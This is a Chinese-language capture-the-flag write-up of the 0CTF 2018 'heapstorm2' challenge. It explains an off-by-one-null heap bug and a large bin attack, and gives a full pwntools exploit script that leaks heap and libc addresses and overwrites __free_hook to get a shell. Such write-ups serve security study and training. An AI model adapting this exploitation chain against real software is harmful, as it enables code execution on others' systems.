---
title: 2018 0ctf heapstorm2
categories: 
- 0CTF2018
---
# heapstorm2

## 前言

前几天做RCT的题做不来看wp提到用到了这道题的方法，于是做一下这道2018年0ctf的题，照着sakura师傅的wp复现了一下

## 程序逻辑

程序一共有4个功能，Alloc，Update，Delete和View。

![main](./1.jpg)

init函数用了mallopt将M_MXFAST置为0，这个变量表示一个阈值，此阈值以下的size分配chunk的时候使用fastbin，否则不用。这里置为0，表示所有的chunk都不走fast bin,无论是分配或是释放。此外程序使用mmap分配了一块内存区域0x13370000，可读可写。map_addr[0]、map_addr[1]、map_addr[2]为/dev/urandom生成的随机数。map_addr[3]=map_addr[2]

![init](./2.jpg)

Alloc()函数从map_addr[4]开始寻找空闲位置(xor寻找)，size要求大于12小于0x1001，使用calloc，因此会将内存清零。map_addr[i]存放的是size和map_addr[0]异或的值，map_addr[i+1]存放的是chunk_addr和map_addr[1]异或的值。

![Alloc](./3.jpg)

Update函数往chunk里写值，这里有一个off-one-null漏洞

![update](./4.jpg)

Delete函数释放堆块并将原位置置为map_addr[0]和map_addr[1]

![Delete](./5.jpg)

View函数要先满足map_addr[2] xor map_addr[3] == 0x13377331，否则不能输出

![View](./6.jpg)

## 漏洞利用

程序中有一个off-one-null漏洞，可以用来chunk extend 或者chunk shrink来构造overlap chunk。

构造下面的chunk：
```py
Alloc(0x18)#0  
Alloc(0x508)#1  
Alloc(0x18)#2  
Update(1,'a'*0x4f0+p64(0x500))  

Alloc(0x18)#3  
Alloc(0x508)#4  
Alloc(0x18)#5  
Update(4,'a'*0x4f0+p64(0x500))  
Alloc(0x18)#6  
```
Delete(1)使得chunk1进入unsorted bin，此时chunk2的prev_size为0x510，size为0x20。Update(0)可以通过one-byte-null修改chunk1的size从0x511到0x500  
Alloc(0x18)从unsorted bin中分割出来大小为0x20的chunk1，Alloc(0x4d8)从unsorted bin中分割出来大小为0x4e0的chunk7(因为这个chunk没有跟chunk2相邻，所以chunk2的prev_in_use还是0)，由于其size改为0x500，unsorted bin用完。Delete(1)使得chunk7的prev_size为0x20,size为0x4e0。此时Delete(2)，chunk2的prev_size为0x510，找到chunk1,chunk1的next chunk即chunk7的prev_in_use为0，chunk7寻址到chunk7+0x4e0处，即0x500,fake_precv_size，也被认为是空闲chunk，于是一个unlink合并了chunk1、chunk7、chunk2。

这个技巧是首先在unsorted bin的后面伪造好fake_prev_size同时利用off-one-null设置好unsorted bin下一个chunk的fake_size(prev_in_use)为0。通过off-one-null修改unsorted bin的size，分配两个chunk,Free第一个和之前的chunk2，合并三个chunk，再分配Alloc(0x38)+Alloc(0x4e8)即可造成Overlap chunk。

overlap chunk:
chunk7:0x040  
chunk2:0x060  
 
同样的套路,到Alloc(0x48)，造成overlap。

chunk8:0x590  
free_chunk:0x5c0 

这时候0x5c0在unsorted bin。Delete(2)使得0x060进入unsorted bin。Alloc(0x4e8)，0x5c0进入large bin而0x060被分配。再Delete(2)使得0x060进去unsorted bin 

![bins](./7.jpg)

![bins2](./8.jpg)

下面通过overlap修改chunk2的bk
```py
#use chunk7 to overwrite chunk2
    storage = 0x13370000 + 0x800
    fake_chunk = storage - 0x20
    p1 = p64(0)*2 + p64(0) + p64(0x4f1)
    p1 += p64(0) + p64(fake_chunk)
    Update(7,p1)
```
再通过overlap修改large bin的bk和bk_nextsize
```py
 #use chunk8 to overwrite large bin
    p2 = p64(0)*4 + p64(0) + p64(0x4e1)#size
    p2 += p64(0) + p64(fake_chunk+8)
    p2 += p64(0) + p64(fake_chunk-0x18-5)
    Update(8,p2)
```

此时再分配一个chunk，会先去检查unsorted bin，如果没有合适的就把其中的chunk插入到large bin中，源码如下：（这里直接搬运sakura师傅的博客）

```c
else
           {
             victim_index = largebin_index (size);
             bck = bin_at (av, victim_index);
             fwd = bck->fd;
             ....
             ....
             ....
             // 如果size<large bin中最后一个chunk即最小的chunk，就直接插到最后
                 if ((unsigned long) (size)
                     < (unsigned long) chunksize_nomask (bck->bk))
                   {
                     fwd = bck;
                     bck = bck->bk;
                     victim->fd_nextsize = fwd->fd;
                     victim->bk_nextsize = fwd->fd->bk_nextsize;
                     fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                   }
                 else
                   {
                     assert (chunk_main_arena (fwd));
               // 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。
             // 直到满足size>=large bin chunk size
                     while ((unsigned long) size < chunksize_nomask (fwd))
                       {
                         fwd = fwd->fd_nextsize;//fd_nextsize指向比当前chunk小的下一个chunk
                         assert (chunk_main_arena (fwd));
                       }
                     if ((unsigned long) size
                         == (unsigned long) chunksize_nomask (fwd))
                       /* Always insert in the second position.  */
                       fwd = fwd->fd;
                     else
                 // 插入
                       {
                         victim->fd_nextsize = fwd;
                         victim->bk_nextsize = fwd->bk_nextsize;
                         fwd->bk_nextsize = victim;
                         victim->bk_nextsize->fd_nextsize = victim;
                       }
                     bck = fwd->bk;
                   }
               }
             else
               victim->fd_nextsize = victim->bk_nextsize = victim;
           }
         mark_bin (av, victim_index);
         victim->bk = bck;
         victim->fd = fwd;
         fwd->bk = victim;
         bck->fd = victim;
```

这里的fwd是0x5c0，victim是0x060。victim->bk_nextsize->fd_nextsize = victim;使得*(fake_chunk-0x18-5+0x20)=*(storage-0x18-5)=0x060。
fwd->bk=victim;使得*(storage-0x20+8)=0x060

当这个chunk处理完了之后继续寻找unsorted bin的下一个chunk，这里我们设置的是fake_chunk，如果不满足分配就插入到large bin中。fake_chunk的size为0x13370800-0x20+0x8=0x133707e8，我们之前通过覆写使得*(0x13370800-0x20-0x18-5+0x20)=*0x133707e3=victim，gdb看一下可以看到e8为\x56或\x55。要求是\x56，来满足一个条件。
```gdb
pwndbg> x/gx 0x133707e3
0x133707e3:	0x000056213c4c8060
```
chunk的mmap标志位置为0。
```c
assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
         av == arena_for_chunk (mem2chunk (mem)));
```
之后alloc(0x48)多试几次就可以得到fake_chunk。

### leak

分配到fake_chunk之后首先把map_addr的前三个成员置为0，第四个置为0x13377331以绕过View的检查。之后将第一个chunk填为storage以通过update重新编辑storage。第二个chunk设为storage-0x20+3，可以泄露出heap_base，同样套路这时候看看heap里哪里有涉及到Libc的，重新设置chunk2为这个地址，泄露出libc

### get shell

同样套路将第二个chunk地址设置为free_hook地址，update填入one_gadget地址

## exp.py
exp基本是sakura师傅的

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
p = process('./heapstorm2')
#p = process(["./heapstorm2"],env={"LD_PRELOAD":'./libc-2.24.so'})
elf = ELF('./heapstorm2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def Alloc(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def Update(index,content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(len(content)))
    p.recvuntil('Content: ')
    p.send(content)

def Delete(index):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def View(index):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def exp():
    #chunk shrink
    Alloc(0x18)#0
    Alloc(0x508)#1
    Alloc(0x18)#2
    Update(1,'a'*0x4f0+p64(0x500))

    Alloc(0x18)#3
    Alloc(0x508)#4
    Alloc(0x18)#5
    Update(4,'a'*0x4f0+p64(0x500))
    Alloc(0x18)#6
    log.success('chunks design ok!')

    Delete(1)
    Update(0,(0x18-12)*'a')
    log.success('overwrite chunk1 size')
    Alloc(0x18)#1
    Alloc(0x4d8)#7

    Delete(1)
    Delete(2)#unlink

    Alloc(0x38)#1--->7 overlap
    Alloc(0x4e8)#2

    #same method to get another one

    Delete(4)
    Update(3,'a'*(0x18-12))

    Alloc(0x18)#4
    Alloc(0x4d8)#8

    Delete(4)
    Delete(5)#unlink

    Alloc(0x48)#4-->8 overlap

    #large bin attack
    #insert unosorted bin to large bin list
    Delete(2)#make chunk 0x5c0 into large bin
    Alloc(0x4e8)#2
    Delete(2)
    #use chunk7 to overwrite chunk2
    storage = 0x13370000 + 0x800
    fake_chunk = storage - 0x20
    p1 = p64(0)*2 + p64(0) + p64(0x4f1)
    p1 += p64(0) + p64(fake_chunk)
    Update(7,p1)
    #use chunk8 to overwrite large bin
    p2 = p64(0)*4 + p64(0) + p64(0x4e1)#size
    p2 += p64(0) + p64(fake_chunk+8)
    p2 += p64(0) + p64(fake_chunk-0x18-5)
    Update(8,p2)
    #gdb.attach(p)
    Alloc(0x48)#2
    #malloc to 0x133707e0
    puts_got = elf.got['puts']
    Update(2,p64(0)*5+p64(0x13377331)+p64(storage))
    payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(storage-0x20+3)+p64(8)
    Update(0,payload)
    View(1)
    p.recvuntil('Chunk[1]: ')
    heap_base = u64(p.recvline().strip('\n')) - 0x60
    log.success('heap base => ' + hex(heap_base))
    #leak libc
    payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(heap_base+0x60+0x10) + p64(8)
    Update(0,payload)
    View(1)
    p.recvuntil('Chunk[1]: ')
    libc_base = u64(p.recvline().strip('\n')) - 88 - 0x3c4b20
    log.success('libc base => ' + hex(libc_base))
    #get shell
    free_hook = libc_base + libc.symbols['__free_hook']
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    shell_addr = libc_base + gadgets[1]
    payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(free_hook) + p64(8)
    Update(0,payload)
    Update(1,p64(shell_addr))
    #Alloc(0x40)
    p.recvuntil('Command: ')
    p.sendline('1')
    Delete(3)
    p.interactive()

exp()

```
![flag](./9.jpg)

## reference

[sakura](http://eternalsakura13.com/2018/04/03/heapstorm2/)
